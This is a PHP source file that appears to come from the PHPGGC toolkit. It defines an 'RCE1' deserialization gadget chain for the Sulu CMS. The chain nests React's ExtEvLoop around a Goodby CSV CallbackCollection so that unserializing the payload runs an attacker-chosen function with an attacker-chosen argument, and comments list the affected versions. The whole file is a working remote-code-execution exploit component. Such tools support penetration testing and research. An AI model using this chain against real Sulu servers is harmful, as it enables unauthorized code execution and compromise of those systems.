<?php

namespace GadgetChain\Sulu;

use PHPGGC\Exception;

class RCE1 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '2.5.0+';
    public static $vector = '__destruct';
    public static $author = 'mcdruid';
    public static $information = 'A Fatal error is thrown, but after the payload
    has been unserialized.';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        $ao = new \ArrayObject([$parameter]);
        $iterator = $ao->getIterator();

        return new \React\EventLoop\ExtEvLoop( // 2.5.0 to 2.5.19, 2.6.0 to 2.6.2
        //return new \RectorPrefix202411\React\EventLoop\ExtEvLoop( // 2.5.19+ and 2.6.3 to 2.6.6
        //return new \RectorPrefix202505\React\EventLoop\ExtEvLoop( // 2.6.7
            new \Goodby\CSV\Export\Standard\Collection\CallbackCollection(
               $function,
               $iterator
            ),
        );
    }
}